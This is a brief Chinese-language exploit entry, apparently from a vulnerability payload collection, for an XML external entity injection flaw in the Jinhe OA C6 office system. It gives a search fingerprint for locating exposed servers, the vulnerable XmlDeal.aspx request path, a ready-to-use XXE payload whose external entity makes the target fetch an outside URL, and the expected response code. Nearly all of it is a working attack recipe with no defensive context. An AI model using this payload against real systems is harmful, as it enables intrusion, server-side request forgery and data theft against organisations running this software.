# 金和OAC6xmldealxml外部实体注入

金和OA ｜ XXE ｜ —
- **指纹**：`body="/C6/WebResource.axd"`
- **请求**：`POST /c6/JHSoft.Web.Message/XmlDeal.aspx HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://www.baidu.com"> %remote;]>
```
- **响应特征**：200